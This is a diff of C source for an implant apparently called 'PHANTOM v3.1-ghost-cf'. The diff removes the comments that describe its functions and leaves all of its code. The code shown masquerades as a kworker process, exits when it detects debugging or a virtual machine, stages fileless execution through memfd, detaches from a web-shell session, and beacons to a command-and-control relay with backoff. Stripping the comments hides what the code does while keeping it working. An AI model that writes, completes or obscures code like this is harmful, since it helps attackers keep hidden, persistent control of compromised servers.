@@ -16,7 +16,7 @@
 
 #define PHANTOM_VERSION "v3.1-ghost-cf"
 
-// NO ANSI COLORS - Plain text for web shells
+
 #define DPRINTF_FLUSH(fmt, ...) do { \
     dprintf(STDERR_FILENO, fmt, ##__VA_ARGS__); \
     fsync(STDERR_FILENO); \
@@ -27,7 +27,7 @@ static void usage(const char *progname) {
 }
 
 int main(int argc, char *argv[]) {
-    // 1. Principal Masquerading
+    
     full_masquerade(argv, argc);
 
     char kworker_name[32];
@@ -59,26 +59,26 @@ int main(int argc, char *argv[]) {
 
     uint16_t relay_port = (uint16_t)atoi(relay_port_str);
 
-    // 2. Network Debug Output (BEFORE forking)
+    
     DPRINTF_FLUSH("[-] C2 Target: %s:%d\n", relay_host, relay_port);
     DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
     DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");
 
 
 
-    // Evasion: Anti-VM & Stalling Logic
+    
     if (ph_stealth_anti_debug_comprehensive() != PH_STEALTH_OK) {
         _exit(0);
     }
 
 
-    // Fileless Execution Staging
+    
     ph_memfd_ctx_t memfd_ctx;
     if (ph_memfd_init(&memfd_ctx) != PH_OK) {
         DPRINTF_FLUSH("STAGE_FAIL: memfd context initialization failed\n");
     }
 
-    // Execution Detachment
+    
     if (daemon_mode) {
         DPRINTF_FLUSH("[-] Detaching from Web Session...\n");
         pid_t pid = fork();
@@ -103,7 +103,7 @@ int main(int argc, char *argv[]) {
         DPRINTF_FLUSH("[+] Deployment Success (Foreground Mode)\n");
     }
 
-    // Core Network Loop with Exponential Backoff
+    
     ph_network_ctx_t net_ctx;
     if (ph_network_init(&net_ctx) != PH_OK) {
         DPRINTF_FLUSH("[ERROR] Network context initialization failed\n");
@@ -119,7 +119,7 @@ int main(int argc, char *argv[]) {
             ph_reconnect_reset(&net_ctx.reconnect);
 
             
-            // Handle connection...
+            
         } else {
             DPRINTF_FLUSH("[!] All C2 ports failed, retrying in backoff...\n");
         }
